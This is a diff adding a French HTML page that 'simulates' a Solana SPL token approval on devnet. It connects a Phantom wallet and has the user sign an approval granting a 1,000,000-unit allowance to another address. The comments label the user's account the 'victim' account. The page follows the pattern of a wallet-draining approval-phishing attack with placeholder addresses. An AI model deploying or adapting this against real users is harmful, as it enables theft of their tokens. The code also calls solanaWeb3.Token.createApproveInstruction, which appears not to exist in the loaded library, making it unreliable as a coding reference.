@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Simuler une approbation SPL sur Devnet</title>
+</head>
+<body>
+    <h1>Simuler une approbation SPL</h1>
+    <button onclick="approveToken()">Approuver un contrat</button>
+    <p id="status">Statut : En attente...</p>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.1/dist/index.min.js"></script>
+    <script>
+        async function approveToken() {
+            try {
+                // Connexion au réseau devnet
+                const connection = new solanaWeb3.Connection('https://api.devnet.solana.com', 'confirmed');
+
+                // Vérifier si Phantom est disponible
+                if (!window.solana || !window.solana.isPhantom) {
+                    document.getElementById('status').innerText = 'Statut : Phantom non détecté.';
+                    return;
+                }
+
+                // Connexion à Phantom
+                await window.solana.connect();
+                const walletPublicKey = window.solana.publicKey;
+                document.getElementById('status').innerText = `Statut : Connecté à ${walletPublicKey.toString()}`;
+
+                // Adresse du token SPL (remplace par ton token)
+                const tokenMint = new solanaWeb3.PublicKey('AdresseDuTokenMint');
+
+                // Adresse du compte SPL de la victime (remplace ou crée-le)
+                const victimTokenAccount = new solanaWeb3.PublicKey('AdresseDuCompteTokenVictime');
+
+                // Adresse du contrat approuvé (simulé, utilise une adresse aléatoire ou réelle)
+                const approvedContract = new solanaWeb3.PublicKey('AdresseDuContratApprouve');
+
+                // Créer la transaction d’approbation
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.Token.createApproveInstruction(
+                        solanaWeb3.TOKEN_PROGRAM_ID,
+                        victimTokenAccount,      // Compte SPL à approuver
+                        approvedContract,        // Contrat qui recevra l’autorisation
+                        walletPublicKey,         // Propriétaire (Wallet A)
+                        [],                      // Pas de multisig
+                        1000000                  // Montant approuvé (1 million d’unités)
+                    )
+                );
+
+                // Ajouter les paramètres de la transaction
+                transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+                transaction.feePayer = walletPublicKey;
+
+                // Signer et envoyer via Phantom
+                const signedTx = await window.solana.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signedTx.serialize());
+                await connection.confirmTransaction(signature);
+
+                document.getElementById('status').innerText = `Statut : Approbation réussie ! Signature : ${signature}`;
+                console.log('Signature :', signature);
+            } catch (error) {
+                document.getElementById('status').innerText = `Statut : Erreur - ${error.message}`;
+                console.error('Erreur :', error);
+            }
+        }
+    </script>
+</body>
+</html>
